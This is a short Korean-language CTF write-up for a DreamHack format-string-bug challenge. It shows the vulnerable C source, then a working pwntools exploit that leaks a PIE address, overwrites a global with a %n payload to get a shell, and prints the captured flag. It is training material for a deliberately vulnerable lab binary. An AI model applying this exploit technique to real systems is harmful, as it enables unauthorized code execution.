# [DreamHack] Format String Bug

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> Exploit Tech: Format String Bug에서 실습하는 문제입니다.
>
> Release: [Format String Bug.zip](https://github.com/h0meb0dy/Dreamhack-Wargame/files/8533881/Format.String.Bug.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/102066383/162664326-0a875a50-e3ee-492a-9e1f-cc3353a5da1c.png)

## Analysis

```c
int changeme;

int main() {
  char buf[0x20];
  
  setbuf(stdout, NULL);
  
  while (1) {
    get_string(buf, 0x20);
    printf(buf); // FSB
    puts("");
    if (changeme == 1337) {
      system("/bin/sh");
    }
  }
}
```

FSB를 이용해서 `changeme`에 1337을 넣으면 셸을 획득할 수 있다.

## Exploit

```python
from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/fsb_overwrite')
else:
    r = remote('host1.dreamhack.games', 16977)

__libc_csu_init_offset = 0x940  # offset of __libc_csu_init() from PIE base
changeme_offset = 0x20101c  # offset of changeme from PIE base


# leak PIE

if REMOTE:
    r.send('%8$p')
else:
    r.send('%7$p')

__libc_csu_init = int(r.recvline()[2:-1], 16)  # __libc_csu_init()
pie = __libc_csu_init - __libc_csu_init_offset  # PIE base
changeme = pie + changeme_offset  # global var <changeme>


# overwrite changeme with 1337

payload = b'%1337c%8$n'.ljust(0x10, b'a')
payload += p64(changeme)

r.send(payload)


r.interactive()
```

```
$ python3 solve.py
[+] Opening connection to host1.dreamhack.games on port 16977: Done
solve.py:17: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.send('%8$p')
[*] Switching to interactive mode















 \xf0aaaaaa\x1
$ cat flag
DH{b283dec57b17112a4e9aa6d5499c0f28}
```